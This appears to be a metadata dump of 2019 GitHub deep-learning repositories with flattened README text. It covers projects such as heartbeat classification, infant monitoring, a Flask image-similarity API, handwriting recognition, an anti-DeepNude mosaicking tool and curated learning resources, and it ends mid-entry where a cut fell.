heartbeat to classify wav NOTE Use Python3 4 The predicted class and the confidence will be displayed Download the dataset from here http www peterjbentley com heartchallenge index html,2019-09-20T19:55:29Z,2019-11-18T19:52:54Z,Jupyter Notebook,MananAgarwal,User,1,1,1,13,master,MananAgarwal,1,0,0,0,0,0,0
wang-jinchao,BabyCare,n/a,BabyCare emsp emspInfant monitoring application based on deep learning and stereo vision x Distance Measurement x Expression Detection Requirement python3 6 tenosorflow ge1 12 Some problem may occur such as mkl https github com tensorflow tensorflow issues 23145 opencv matlab engine MATLAB R2014b or later numpy dlib To install the engine API choose one of the following emspAt a Windows operating system prompt cd matlabrootexternenginespython python setup py install You might need administrator privileges to execute these commands emspAt a macOS or Linux operating system prompt cd matlabroot extern engines python python setup py install Stereo Camera Calibration 1 Prepare images camera and calibration pattern 2 Add image pairs 3 Calibrate the stereo camera 4 Evaluate calibration accuracy 5 Adjust parameters to improve accuracy if necessary 6 Export the parameters object chessboard emsp emspTo improve the results use between 10 and 20 images of the calibration pattern The calibrator requires at least three images Use uncompressed images or lossless compression formats such as PNG The calibration pattern and the camera setup must satisfy a set of requirements to work with the calibrator emsp emspThe checkerboard pattern you use must not be square One side must contain an even number of squares and the other side must contain an odd number of squares Therefore the pattern contains two black corners along one side and two white corners on the opposite side This criteria enables the app to determine the orientation of the pattern The calibrator assigns the longer side to be the x direction Size Formats Number Spacing A3 420mm297mm 10 7 42mm Attach the checkerboard printout to a flat surface Imperfections on the surface can affect the accuracy of the calibration Measure one side of the checkerboard square You need this measurement for calibration The size of the squares can vary depending on printer settings To improve the detection speed set up the pattern with as little background clutter as possible Keep the pattern in focus but do not use autofocus Do not modify the images for example do not crop them Capture the images of the pattern at a distance roughly equal to the distance from your camera to the objects of interest For example if you plan to measure objects from 2 meters keep your pattern approximately 2 meters from the camera Place the checkerboard at an angle less than 45 degrees relative to the camera plane Make sure the checkerboard pattern is fully visible in both images of each stereo pair Capture a variety of images of the pattern so that you have accounted for as much of the image frame as possible Lens distortion increases radially from the center of the image and sometimes is not uniform across the image frame To capture this lens distortion the pattern must appear close to the edges of the captured images Stereo Calibration Results Experimental model Distance Measurement emsp emsp Using image semantic segmentation to get pixel level image tags The neural network model is an improvement from segnet The basic structure is as shown above emsp emspThrough Hough Transform to detection line and using convex hulls together to measure the minimum pixel distance on the image Using the Transformation from the 3D space to the pixel plane with the method of binocular vision to calculate the height from the camera to the plane Usage 1 Training model python train py iteration 20000 snapshot 4000 optimizer adadelta learningrate 1 0 1 run python main py Expression Detection,2019-10-15T17:27:31Z,2019-11-18T07:13:52Z,Python,wang-jinchao,User,1,1,0,83,master,wang-jinchao,1,0,0,0,0,0,0
dlfaults,taxonomy,n/a,taxonomy Taxonomy of Real Faults in Deep Learning Systems,2019-10-23T11:15:36Z,2019-12-03T09:45:11Z,Rich Text Format,dlfaults,User,2,1,0,4,master,dlfaults,1,0,0,0,0,0,0
Pofatoezil,image-similarity-Keras-FLASK-Redis,n/a,Deploying Image Similarity Deep Laerning Model by Flask Redis and Keras https www pyimagesearch com 2018 01 29 scalable keras deep learning rest api https www pyimagesearch com 2018 01 29 scalable keras deep learning rest api https blog keras io building a simple keras deep learning rest api html https blog keras io building a simple keras deep learning rest api html emsp emspapp py API emsp emspapptest py emsp emspappre py Redis databasenamelist xlsxjpg imgfeaturef npy imgfeatureb npy npy 1 Image Similarity Model Siamese network Triplet network 1query image pair image pair image pair Siamese network Cosine Similarity L2 distance Siamese network CNNMerge image pairNetwork APIGCPRAMGPU 224 224 image pair60 3 3GB RAM 8G ram GPU batch 32 image features npy CNN model image featurefeature 0 5image features 550 MB RAM import moudle python import os from flask import Flask rendertemplate request redirect urlfor sendfile from werkzeug utils import securefilename import pandas as pd import numpy as np from PIL import Image import PIL ImageOps from tensorflow keras applications vgg16 import VGG16 preprocessinput from tensorflow keras import Model from tensorflow keras layers import Lambda Flatten import tensorflow keras backend as K import matplotlib pyplot as plt import tensorflow as tf import redis base64 sys uuid json time from threading import Thread Function Introduction loaddatadirectory image feature python def loaddatadirectory imglist pd readcsv namelist csv return imglist np load imgfeaturef npy np load imgfeatureb npy loadmodel CNN model pre trained VGG16Flatten L2 normalize paper CNN python def loadmodel vgg16 VGG16 weights imagenet includetop False no fc layer output shape 7 7 512 flat Flatten vgg16 output l2norm Lambda lambda x K l2normalize x axis 1 flat model Model vgg16 input l2norm return model resizeaspectratio function python def resizeaspectratio img size w h img size col row targetw targeth size ratio min targetw w targeth h newimg img resize int w ratio int h ratio return newimg padding paddingResize 200padding224 224 python def padding img size color 255 255 255 w h img size col row targetw targeth size newimg PIL ImageOps expand img targetw w 2 targeth h 2 color resize size return newimg searchingdisplay function top2020index idx1 idx2 idx3 idx20 python def searchingdisplay top20 imgs imgname row 5 1 col 8 fig plt figure figsize 4 col 4 row imgf imgb imgs fig addsubplot row col 1 plt gca settitle format imgname 0 plt imshow imgf fig addsubplot row col 2 plt gca settitle format imgname 1 plt imshow imgb for i index in enumerate top20 tmpf dblist front iloc index tmpb dblist back iloc index imgf np squeeze imgspreprocesssect tmpf imgb np squeeze imgspreprocesssect tmpb fig addsubplot row col i 2 1 8 plt gca settitle format i tmpf plt imshow imgf fig addsubplot row col i 2 2 8 plt gca settitle format i tmpb plt imshow imgb return fig python def imgspreprocesssect imgnames resizesize 200 200 targetsize 224 224 directory database param imgnames list of img name output np array for img batch row col channel output for name in imgnames img Image open directory name img resizeaspectratio img resizesize img padding img targetsize output append np array img return np array output 2 FLASK python app Flask name app config UPLOADFOLDER uploads app config DATABASE database app config ALLOWEDEXTENSIONS set JPG JPEG png jpg jpeg gif allowedfile python def allowedfile filename return in filename and filename rsplit 1 1 in app config ALLOWEDEXTENSIONS index indexUserServerfunction index html templates rendertemplate function python app route def index return rendertemplate index html python link href netdna bootstrapcdn com bootstrap 3 0 0 css bootstrap min css rel stylesheet jpg upload index Server Server uploadedfile function python app route upload methods POST def upload file request files file file2 request files file2 if file and allowedfile file filename and file2 and allowedfile file2 filename filename securefilename file filename filename2 securefilename file2 filename file save os path join app config UPLOADFOLDER filename file2 save os path join app config UPLOADFOLDER filename2 return redirect urlfor uploadedfile filename filename filename2 filename2 uploadedfile modelL2 normalizationimage feature Dot Similarity 0 5np argsort simfront simback 20idx Searchingdisplay function output python app route uploads def uploadedfile filename filename2 model loadmodel imgf Image open uploads filename imgf resizeaspectratio imgf 200 200 imgf padding imgf 224 224 imgfin preprocessinput np expanddims np array imgf axis 0 queryfeaturefront model predict imgfin 0 simfront queryfeaturefront dot featuref T imgb Image open uploads filename2 imgb resizeaspectratio imgb 200 200 imgb padding imgb 224 224 imgbin preprocessinput np expanddims np array imgb axis 0 queryfeatureback model predict imgbin 0 simback queryfeatureback dot featureb T top20 np argsort simfront simback 20 1 fig searchingdisplay top20 imgf imgb filename filename2 fig savefig output jpg format filename return sendfile output jpg format filename mimetype image jpg python if name main dblist featuref featureb loaddatadirectory model loadmodel app debug True Debug app run host 127 0 0 1 port int 5000 cmd python app py Serverport8080 127 0 0 1 8080 API unloadedfile loadmodel if name main model loadmodel error function Flaskmodel predict error python tensorflow python framework errorsimpl FailedPreconditionError Error while reading resource variable dense kernel from Container localhost This could mean that the variable was uninitialized Not found Container localhost does not exist Could not find resource localhost dense kernel node dense MatMul ReadVariableOp 1 Session 2 graph session load model function python def loadmodel global model global graph sess graph tf getdefaultgraph sess tf Session graph graph K setsession sess vgg16 VGG16 weights imagenet includetop False no fc layer output shape 7 7 512 flat Flatten vgg16 output l2norm Lambda lambda x K l2normalize x axis 1 flat model Model vgg16 input l2norm print prediction in loadmodel fnc print model predict np zeros 1 224 224 3 python with graph asdefault K setsession sess model predict python Error Failed to get convolution algorithm This is probably because cuDNN failed to initialize Flask API loadmodel Falskdebug modetfgraph session Debug Mode Debug Mode app run usereloader Flase python if name main dblist featuref featureb loaddatadirectory loadmodel app debug True app run host 0 0 0 0 port int 5000 usereloader False 3 Redis python,2019-10-29T06:53:59Z,2019-12-08T14:02:09Z,Python,Pofatoezil,User,0,1,0,26,master,Pofatoezil,1,0,0,0,0,0,1
manavpradhan,Hindi_handwriting_recognizer,n/a,Hindihandwritingrecognizer a deep learning model that successfully recognizes hindi alphabets characters DEMO click to watch Watch the video https img youtube com vi nTnPcnt5haw maxresdefault jpg https youtu be nTnPcnt5haw Training the model Download or clone the repository extract the data zip which will give data csv dataset for devanagricharacters run letters py this code will train the model and create a weight file devanagri h5 Testing the model run handwriting recog py When you see the frame and thresh screen make sure your background doesn t have any blue items Draw the character you wish onto the frame using a blue pointer object blue pen with cap the frame will show name of character you drew,2019-10-27T17:28:17Z,2019-10-29T17:25:56Z,Python,manavpradhan,User,1,1,0,12,master,manavpradhan,1,0,0,0,0,0,0
1093842024,anti-deepnude,n/a,anti deepnude NSFW technology for gooduse deep learning model to mosaic nude model precisely automaticly Motivation DeepNude https github com stacklikemind deepnudeofficial project is very popular it s fancy but can be used evil As I m working on recognizing nude porn vulgar image project I developed several deep models which have achieve pretty good precise Meanwhile these model can be used to mosaic nude picture due to the activation feature maps can concentrate on the nude region For Technology good I developed a harmony algorithm to anti deepnude opennsfw https github com yahoo opennsfw nsfwmodel https github com GantMan nsfwmodel nudenet https github com bedapudi6788 NudeNet 98 How to mosaic with different region area modify two parameters weight1 and weight2 python def generalharmony self imgpil weight1 1 0 weight2 0 ret hp self classifyimgpil imgpil True bbox heatmapsindex maxvalue avgvalue bboxutil analyzebox hp weight1 weight2 imgblur bboxutil imgblur2 imgpil hp heatmapsindex maxvalue return imgblur Some mosaic Example example1 https github com 1093842024 anti deepnude blob master results 0antideepnude jpg example3 https github com 1093842024 anti deepnude blob master results 2antideepnude jpg TODO combine humandet model human keypoints model and human segmentation model can get more accuracy results,2019-09-23T09:00:06Z,2019-09-27T07:49:02Z,Python,1093842024,User,1,1,0,17,master,1093842024,1,0,0,0,0,0,0
anninterpreter,Achievements,n/a,Certifications Deep Learning Specialization https www coursera org account accomplishments specialization F6YWSX45RL3J 1 Neural Networks and Deep Learning https www coursera org account accomplishments verify 56SN7L8EUKMX 2 Improving Deep Neural Networks Hyperparameter tunning Regularization and Optimization https www coursera org account accomplishments verify F299FXC5NPXG 3 Structuring Machine Learning Projects https www coursera org account accomplishments verify CK2RL6Q3N7QJ 4 Convolutional Neural Networks https www coursera org account accomplishments verify HKA5EFGFLAEM 5 Sequence Models https www coursera org account accomplishments verify 3ER4YGGT5FH7 TensorFlow in Practice Specialization https www coursera org account accomplishments specialization 8AR57NNXZCVT 1 Introduction to TensorFlow for Artificial Intelligence Machine Learning and Deep Learning https www coursera org account accomplishments verify REB4F6SKBL25 2 Convolutional Neural Networks in TensorFlow https www coursera org account accomplishments verify YE2QZAREBBAF 3 Natural Language Processing in TensorFlow https www coursera org account accomplishments verify N85CP29JC7K6 4 Sequences Time Series and Prediction https www coursera org account accomplishments verify 7K8RDBH53XKK IBM Data Science Professional Certificate 1 What is Data Science 2 Open Source tools for Data Science 3 Data Science Methodology 4 Python for Data Science and AI 5 Databases and SQL for Data Science 6 Data Analysis with Python https www coursera org account accomplishments verify KRK5ZRK2N7NH 7 Data Visualization with Python https www coursera org account accomplishments verify GTPCEKZMXHUJ 8 Machine Learning with Python https www coursera org account accomplishments verify WQX9LPPGYM2L 9 Applied Data Science Capstone Advanced Machine Learning with TensorFlow on Google Cloud Platform Specialization 1 End to End Machine Learning with TensorFlow on GCP 2 Production Machine Learning Systems 3 Image Understanding with TensorFlow on GCP https www coursera org account accomplishments verify NJ94KY52NN5C 4 Sequence Models for Time Series and Natural Language Processing https www coursera org account accomplishments verify NM9XBA2YRBMJ,2019-10-31T15:55:40Z,2019-10-31T16:22:53Z,n/a,anninterpreter,User,1,1,0,3,master,anninterpreter,1,0,0,0,0,0,0
msunil10052,Sales-Forecasting,n/a,Sales Forecasting Repository for Classical Forecasting Methods Machine Learning and Deep Learning Models for Time Series Forecasting The objective of case study is to compare various models with minimal feature engineering techniques Time series data is a series of data points measured at consistent time intervals which may be hourly daily weekly every 10 days and so on In a time series data each data point in the series depends on the previous data points In multivariate Time Series data multiple variables will be varying over time Each variable depends not only on its past values but also has some dependency on other variables This dependency is used for forecasting future values In univariate Time Series data only one variable is varying over time Here we will address the problem using Classical Linear Models Tree based algorithms Ensemble Methods and Neural Network based Methods Problem Statement Your client is global shampoo manufacturer The client has shared with you the demo data set and a data dictionary The business is interested in understanding the drivers behind the shampoo consumption and are looking for data driven recommendations for improving the sales Data Description This dataset describes the monthly sales of shampoo over a 3 year period The units are a sales count and there are 36 observations The original dataset is credited to Makridakis Wheelwright and Hyndman 1998 salesdata images Salesdata png Modeling Methods There are three classes of methods that might be interesting to explore on this problem they are Classical Forecasting Methods Machine Learning Methods Deep Learning Methods Code The solution is split into Exploratory data analysis and Model Building Exploratory data analysis results are stored in below notebook 1 Exploratory data analysis ipynb Below are the notebooks for Models 1 Machine Learning Model 1 ipynb for Non linear models 2 Deep Learning Model 1 ipyb for Keras based linear regression 3 Classical Linear Models ipynb for linear models You need to have Jupyter Notebook http ipython org notebook html installed to run the file If you do not have Python installed yet it is highly recommended that you install the Anaconda http continuum io downloads distribution of Python which already has the above packages and more included Before running the file first install all necessary dependencies pip3 install r requirements txt Run To run the notebook open terminal or command window navigate to the top level project directory Multivariate Time Series Forecasting that contains this README and run one of the following commands bash ipython notebook Exploratory data analysis ipynb or bash jupyter notebook Exploratory data analysis ipynb,2019-09-26T11:36:34Z,2019-12-09T13:02:48Z,Jupyter Notebook,msunil10052,User,1,1,0,7,master,msunil10052,1,0,0,0,0,0,0
TheoSimier,Moderation-online-content,n/a,Project Moderation of online content through Natural Language Processing Machine Learning and Deep Learning The objective of this master project is to illustrate how techniques of Natural Language Processing and Machine Learning can be used to gain meaningful information from text During this thesis I explain the most commonly used techniques and apply them on a concrete example the creation of an algorithm capable of monitoring questions by checking if a question respects or not the terms and conditions of a question and answer website named Quora I started by creating statistical features normalizing the questions and transforming them into a format that classification algorithms can handle Finally I used a Logistic Regression a Random Forest and a Deep Learning model to predict if the questions were compliant or not The best algorithm reached an accuracy of 87 The database can be found at the following url https www kaggle com c quora insincere questions classification data Glove embeddings can be retrieved at the following url https nlp stanford edu projects glove Details on the sources of the project can be found on the references of Report Moderation of online content pdf This master project was realized during my MSc in Data Analytics Artificial Intelligence at EDHEC Author Theo Simier under the direction of Prof Dr Christophe Croux,2019-10-14T21:04:01Z,2019-10-14T21:14:35Z,HTML,TheoSimier,User,1,1,0,0,master,,0,0,0,0,0,0,0
allen1881996,CrazyAllenDataScience,n/a,CrazyAllenDataScience Hello everyone This is Crazy Allen I am an enthusiastic learner of machine learning and deep learning In my Github I will share my notebooks of learning data science and some good resources that help me a lot Also I think that s a perfect place to record what I have done and what I want to complete I am a beginner as well as a striver Learning never ends 1 Python https github com allen1881996 CrazyAllenDataScience tree master Python 1 1 Python Basics and Mudules Python Basics Strings https github com allen1881996 CrazyAllenDataScience blob master Python Common 20Problem 20with 20Strings ipynb Data Structure https github com allen1881996 CrazyAllenDataScience blob master Python Data 20Structure ipynb Sets https github com allen1881996 CrazyAllenDataScience blob master Python Sets ipynb Named Tuples https github com allen1881996 CrazyAllenDataScience blob master Python Named 20Tuples ipynb Function https github com allen1881996 CrazyAllenDataScience blob master Python Function ipynb Generators https github com allen1881996 CrazyAllenDataScience blob master Python Generators ipynb Decorators https github com allen1881996 CrazyAllenDataScience blob master Python Decorators ipynb Error Handling https github com allen1881996 CrazyAllenDataScience blob master Python Error 20Handling ipynb Files https github com allen1881996 CrazyAllenDataScience blob master Python File 20Objects ipynb Formatting https github com allen1881996 CrazyAllenDataScience blob master Python Formatting ipynb OOP https github com allen1881996 CrazyAllenDataScience blob master Python OOP ipynb Variable Scope https github com allen1881996 CrazyAllenDataScience blob master Python Variable 20Scope ipynb Modules CSV https github com allen1881996 CrazyAllenDataScience blob master Python Modules CSV 20Module ipynb Collections https github com allen1881996 CrazyAllenDataScience blob master Python Modules Collections ipynb Datetime https github com allen1881996 CrazyAllenDataScience blob master Python Modules Datetime 20Module ipynb JSON https github com allen1881996 CrazyAllenDataScience blob master Python Modules JSON 20Module ipynb re https github com allen1881996 CrazyAllenDataScience blob master Python Modules re 20Module ipynb Random https github com allen1881996 CrazyAllenDataScience blob master Python Modules Random 20Module ipynb OS https github com allen1881996 CrazyAllenDataScience blob master Python Modules OS 20Module ipynb Pillow https github com allen1881996 CrazyAllenDataScience blob master Python Modules Pillow 20Module 20 ipynb Additions Package Management https github com allen1881996 CrazyAllenDataScience tree master Python Package 20Management Jupyter Notebook https github com allen1881996 CrazyAllenDataScience blob master Python Jupyter 20Notebook ipynb Some useful Fuctions https github com allen1881996 CrazyAllenDataScience blob master Python Some 20Useful 20Functions ipynb Some trick Stuff https github com allen1881996 CrazyAllenDataScience blob master Python Some 20Tricky 20Stuff 20 ipynb Learning Resources Youtube Python Tutorials by Corey Schafer https www youtube com playlist list PL osiE80TeTt2d9bfVyTiXJA UTHn6WwU I found Corey s Tutorials very useful His explanation is detailed and easy to understand Book Python Crash Course 2nd Edition A Hands On Project Based Introduction to Programming https www amazon com Python Crash Course 2nd Edition dp 1593279280 ref sr14 keywords Python qid 1574135537 s books sr 1 4 Web W3school https www w3schools com python default asp Python Documentation https docs python org 3 tutorial index html 1 2 Python Data Analysis Pandas https github com allen1881996 CrazyAllenDataScience tree master Python Libraries Pandas I have learned Pandas using Python Data Science Handbook https www amazon com Python Data Science Handbook Essential dp 1491912057 ref sr13 crid BQ8SPZ8S88SV keywords python data science handbook qid 1574349439 sprefix Python data 2Caps 2C138 sr 8 3 I strongly suggest Jake Vanderplas s Github https github com allen1881996 PythonDataScienceHandbook which includes this handbook in the form of Jupyter Notebook I also use these notebooks to learn and would love to share my summary and notes In addition using Guilherme Samora s Pandas exercises https github com guipsamora pandasexercises is a good way to train your Pandas skills What s more sentex s tutorial of Data Analysis using Pandas https www youtube com watch v nLw1RNvfElg list PLQVvvaa0QuDfSfqQuee6K8opKtZsh7sA9 can help you quickly learn how to analysis data with Pandas I have uploaded my codes and notes of his tutorial Numpy Matplotlib https github com allen1881996 CrazyAllenDataScience tree master Python Data 20Analysis Matplotlib Again the best Youtube channel in my mind Corey Schafer s tutorial of Matplotlib https www youtube com watch v UO98lJQ3QGI list PL osiE80TeTvipOqomVEeZ1HRrcEvtZB includes the basic of Matplotlib I have made a IPython form of his tutorial with my notes Web Scraping https github com allen1881996 CrazyAllenDataScience tree master Python Libraries Web 20Scraping 2 Deep Learning Build Neural Networks with Pytorch https github com allen1881996 CrazyAllenDataScience tree master Deep 20Learning Build 20Neural 20Networks 20with 20Pytorch This notebook is for sentdex s tutorial of Pytorch https www youtube com playlist list PLQVvvaa0QuDdeMyHEYc0gxFpYwHY2Qfdh which is a great Tensorflow in Practice https github com allen1881996 CrazyAllenDataScience tree master Deep 20Learning TensorFlow 20in 20Practice This part include my notebook of Coursera s Tensorflow in Practice Specialization It s a quick guide of Tensorflow 2 0 and including Neural Network Computer Vision NLP and Sequence Model 3 Projects Time Series Analysis of Sunspots https github com allen1881996 CrazyAllenDataScience blob master Project time series analysis of sunspots ipynb Predicted the monthly sunspot number based on the dataset that contains monthly mean sunspot numbers from 1749 to 2018 Built multiple models including Naive Forecast Moving Average Forecast SARIMA Forecast Simple DNN Forecast and RNN Forecast Finally got a mean absolute error of 17 645 Convolutional Neural Network for Natural Images Classification https github com allen1881996 CrazyAllenDataScience blob master Project cnn for natural images classification ipynb Classified a nature images dataset of 6899 images from 8 distinct classes with 90 out of sample accuracy Built a 2 D convolutional neural network with 3 convolutional layers and 2 linear layers using Pytorch,2019-10-21T16:59:56Z,2019-12-02T21:51:31Z,Jupyter Notebook,allen1881996,User,1,1,0,7,master,allen1881996,1,0,0,0,0,0,0
mukulanandchas,IMAGE-DENOISING-AND-SUPER-RESOLUTION-USING-RESIDUAL-LEARNING-OF-DEEP-CNN,n/a,Dataset Used BSDS500,2019-11-01T03:55:30Z,2019-11-14T05:58:51Z,Python,mukulanandchas,User,1,1,0,3,master,mukulanandchas,1,0,0,0,0,0,0
hank08tw,Maximum-resistive-motor-ball-throwing-distance-and-path-by-deep-reinforcement-learning,n/a,Maximum resistive motor ball throwing distance and path by deep reinforcement learning Deduce the physical equation of the path of the ball thrown by resistive motor Calculated single or double resistive motor maximum ball throwing distance and path by different reinforcement learning algorithm like td0 sarsa policy gradient a3c dql by python Designed user interface to control the motors to perform ball throwing and made RL model imitate and learned from these data Used svgwrite to demo visualize project including user input ball throwing method and models training process Analyzed the result and advantages of different reinforcement learning algorithm and try to interpret why some of them are more suitable for this problem since no one did similar research to this one If you want to demo by yourself install virtual environment and svgwrite then run in the terminal,2019-10-04T15:57:19Z,2019-10-05T01:47:25Z,Jupyter Notebook,hank08tw,User,1,1,0,3,master,hank08tw,1,0,0,0,0,0,0
krishnamali1101,Kickstart-AI-ML,artificial-intelligence#computer-vision#data-science#deep-learning#machine-learning#machinelearning#natural-language-processing#neural-network#nlp#python#reinforcement-learning#signal-processing,Tutorials Python https github com krishnamali1101 Amazing python Basic python https www youtube com playlist list PLsyeobzWxl7poL9JTVyndKe62ieoN MZ3 Advance python https www youtube com playlist list PL osiE80TeTt2d9bfVyTiXJA UTHn6WwU ML DL Fundamentals by deeplizard https www youtube com playlist list PLZbbT5os2xq7LwI2y8QtvuXZedL6tQU ML ML basics intro by Udacity https www youtube com playlist list PLAwxTw4SYaPkQXg8TkVdIvYv4HfLG7SiH ML normal by sentdex https www youtube com playlist list PLQVvvaa0QuDfKTOs3KeqkaG2P55YRn5v ML Advance by Andrew NG https www youtube com playlist list PLLssT5zDsK h9vYZkQkYNWcItqhlRJLN DeepLearning Maths https www youtube com channel UCYOjabesuFRV4b17AJtAw playlists Linear Algebra https www youtube com playlist list PLZHQObOWTQDMsr9K rj53DwVRMYO3t5Yr Calculas https www youtube com playlist list PLZHQObOWTQDPD3MizzM2xVFitgF8hEab DL DL Intro by DeepLearning TV https www youtube com playlist list PLjJh1vlSEYgvGod9wWiydumYl8hOXixNu Deep Learning Normal Udacity Nanodegree Siraj Raval https www youtube com playlist list PL2 dafEMk2A7YdKv4XfKpfbTH5z6rEEj3 DL Advance By Andrew NG https www youtube com playlist list PLBAGcD3siRDguyYYzhVwZ3tLvOyyG5k6K Deep Reinforcement Learning Nice tutorials to understand basics of deep reinforcement learning https www youtube com playlist list PLZbbT5os2xoWNVdDudn51XM8lOuZNjv Tensorflow Deep Learning with Tensorflow by cognitive class https www youtube com playlist list PL XeOa5hMEYxNzHM7YLRjIwE1k3VQpqEh DL with TensorFlow by tensorflow https www youtube com channel UC0rqucBdTuFTjJiefW5t IQ playlists by sentdex https www youtube com playlist list PLSPWNkAMSvv5DKeSVDbEbUKSsK4Z GgiP Mathematics of Machine Learning Probability statistics Calculus Linear algebra Intro kickstart Use of Mathematics in Machine Learning siraj https www youtube com watch v 8onB7rPG4Pk most fundamental math concepts in Machine Learning siraj https www youtube com playlist list PL2 dafEMk2A7mu0bSksCGMJEmeddUH4D In Detail Probability jbstatistics https www youtube com playlist list PLvxOuBpazmsOGOursPoofaHyz1NpxbhA Probability statisticsfun https www youtube com playlist list PL482E6C6B5F0A30E7 Statistics Khan Academy https www youtube com playlist list PL1328115D3D8A2566 Linear Algebra 3Blue1Brown https www youtube com playlist list PLZHQObOWTQDPD3MizzM2xVFitgF8hEab Differential equations 3Blue1Brown https www youtube com playlist list PLZHQObOWTQDNPOjrT6KVlfJuKtYTftqH6 Extra Probability statistics in detail jbstatistics https www youtube com user jbstatistics playlists Probability statistics in detail statisticsfun https www youtube com user statisticsfun playlists Multivariable calculus 3Blue1Brown https www youtube com playlist list PLSQl0a2vh4HC5feHa6Rc5c0wbRTx56nF7 Geometry 3Blue1Brown https www youtube com playlist list PLZHQObOWTQDMXMi3bUMThGdYqos36XlA Top YouTube Channels to Learn Statistics and Math http www gobdon com youtube channels statistics math w 12039 Dataset https skymind ai wiki open datasets https makingnoiseandhearingthings com 2018 04 19 datasets for data cleaning practice https www springboard com blog free public data sets data science project https archive ics uci edu ml index php https archive ics uci edu ml datasets php Top Sources For Machine Learning Datasets https towardsdatascience com top sources for machine learning datasets bb6d0dc3378b https medium com towards artificial intelligence the 50 best public datasets for machine learning d80e9f030279 https www analyticsvidhya com blog 2018 03 comprehensive collection deep learning datasets https elitedatascience com datasets https lionbridge ai datasets the 50 best free datasets for machine learning https www drivendata org competitions 55 schneider cold start page 110 https www drivendata org competitions 55 schneider cold start data Cheatsheets https github com kailashahirwar cheatsheets ai https becominghuman ai cheat sheets for ai neural networks machine learning deep learning big data 678c51b4b463 Data Preparation Data preprocessing http www cs ccsu edu markov ccsucourses datamining 3 html 7 Steps to Mastering Data Preparation for Machine Learning with Python 2019 https www kdnuggets com 2019 06 7 steps mastering data preparation python html fbclid IwAR2R3sWkxD2xCnqEYPBvp 25DSbE284uyeFu9nTZf59Q6KJ4Z0n V9HQ Outlier Detection in Python using PyOD Library https www analyticsvidhya com blog 2019 02 outlier detection python pyod utmsource facebook com utmmedium social fbclid IwAR0n7FDofkP2Kd422E33fNdhlTwiQz1nJ XVOYaHeS9 Jom7WROI9GO3cU Visualization Data visualization for beginners Part 1 https www hackerearth com blog developers data visualization techniques Part 2 https www hackerearth com blog developers data visualization for beginners part 2 Part 3 https www hackerearth com blog developers data visualization for beginners part 3 Interactive data visualization libs https towardsdatascience com interactive data visualization 167ae26016e8 visualdl lib A platform to visualize the deep learning process and result http visualdl paddlepaddle org documentation visualdl en develop gettingstarted introductionen html https github com PaddlePaddle VisualDL http visualdl paddlepaddle org An example of how to use VisualDL with PyTorch https nbro github io blogging 2019 01 06 an example of how to use visualdl with pytorch A visual introduction to machine learning Part 1 A Decision Tree http www r2d3 us visual intro to machine learning part 1 Part 2 Bias and Variance http www r2d3 us visual intro to machine learning part 2 Explained Visually http setosa io ev Explained Visually EV is an experiment in making hard ideas intuitive inspired the work of Bret Victor s Explorable Explanations Sign up to hear about the latest Topics Ordinary Least Squares Regression http setosa io ev ordinary least squares regression Principal Component Analysis http setosa io ev principal component analysis Image Kernels http setosa io ev image kernels Eigenvectors and Eigenvalues http setosa io ev eigenvectors and eigenvalues Pi http setosa io ev pi Sine and Cosine http setosa io ev sine and cosine Exponentiation http setosa io ev exponentiation Markov Chains http setosa io ev markov chains Conditional probability http setosa io ev conditional probability Setosa http setosa io Visualise any Math equation https www desmos com calculator http fooplot com W3sidHlwZSI6 ConvNetJS https cs stanford edu people karpathy convnetjs index html Deep Learning in your browser ConvNetJS is a Javascript library for training Deep Learning models Neural Networks entirely in your browser Open a tab and you re training No software requirements no compilers no installations no GPUs no sweat Four Experiments in Handwriting with a Neural Network https distill pub 2016 handwriting Google Magenta https magenta tensorflow org demos A primary goal of the Magenta project is to demonstrate that machine learning can be used to enable and enhance the creative potential of all people The demos and apps listed on this page illustrate the work of many people both inside and outside of Google to build fun toys creative applications research notebooks and professional grade tools that will benefit a wide range of users AI Experiments experiments withgoogle https experiments withgoogle com collection ai AI Experiments is a showcase for simple experiments that make it easier for anyone to start exploring machine learning through pictures drawings language music and more Top 10 deep learning experiences run on your browser https www dlology com blog top 10 deep learning experiences run on your browser A Neural Network Playground TensorFlow https playground tensorflow org DL Demos http deeplearning net demos CNN training Visual Demo https teachablemachine withgoogle com GAN training visual demo https poloclub github io ganlab Visualization in Deep Learning https medium com multiple views visualization research explained visualization in deep learning b29f0ec4f136 Machine Learning for Visualization https medium com enjalot machine learning for visualization 927a9dff1cab Data Driven Documents https d3js org Visualizing K Means Clustering https www naftaliharris com blog visualizing k means clustering Data Science Algos 11 Important Model Evaluation Metrics for Machine Learning Everyone should know https www analyticsvidhya com blog 2019 08 11 important model evaluation error metrics utmsource facebook com utmmedium social Master Dimensionality Reduction with these 5 Must Know Applications of Singular Value Decomposition SVD in Data Science https www analyticsvidhya com blog 2019 08 5 applications singular value decomposition svd data science NLP nlp library This is a curated list of papers that I have encountered in some capacity and deem worth including in the NLP practitioner s library https github com mihail911 nlp library NLP Progress Repository to track the progress in Natural Language Processing NLP including the datasets and the current state of the art for the most common NLP tasks https nlpprogress com https github com sebastianruder NLP progress NLP Use case 1 Machine Translation https lnkd in fAYvEne 2 Question Answering Like Chat bot https lnkd in fFZmP4f 3 Sentiment Analysis https lnkd in fUDGAQW 4 Text Search with Synonyms https lnkd in fnUaH 5 Text Classifications https lnkd in f8mjKAP 6 Spelling Corrector https lnkd in f8JXNUv 7 Entity Person Place or Brand Recognition https lnkd in f2fzgAa 8 Text Summarization https lnkd in fdzWqXC 9 Text Similarity https lnkd in fvsWuM 10 Topic Detection https lnkd in fxmhJZc 11 Emotion Recognition https lnkd in fK4m66Q 12 Language Identification https lnkd in fqfjxF9 13 Document Ranking https lnkd in fJZnkqz 14 Fake News Detection https lnkd in fkrkF8Q Alternative Reading Know Data Science https lnkd in fMHtxYP Understand How to answer Why https lnkd in f396Dqg Machine Learning Terminology https lnkd in fCihY9W Understand Machine Learning Implementation https lnkd in f5aUbBM Machine Learning on Retail https lnkd in fihPTJf and Marketing https lnkd in fUDGAQW Top 5 Resources to Master NLP Natural language processing Natural Language Processing With Python by Steven Bird Ewan Klein and Edward Lo https lnkd in gCFKZAs Repository to track the progress in Natural Language Processing NLP including the datasets and the current state of the art for the most common NLP tasks https lnkd in gcgdVPR Modern NLP Tutorial with Python Code Jupyter Notebook https lnkd in gUvYgbE A Quick and Easy Text Summarization tutorial Code Deploy https lnkd in gyPgUPF Learn Data Science NLP By Coding First https lnkd in gn8U22C spaCy Cheat Sheet https lnkd in gDYXQPs NLTK Cheat Sheet https lnkd in gwp45E7 8 Excellent Pretrained Models to get you Started with Natural Language Processing NLP https www analyticsvidhya com blog 2019 03 pretrained models get started nlp utmsource 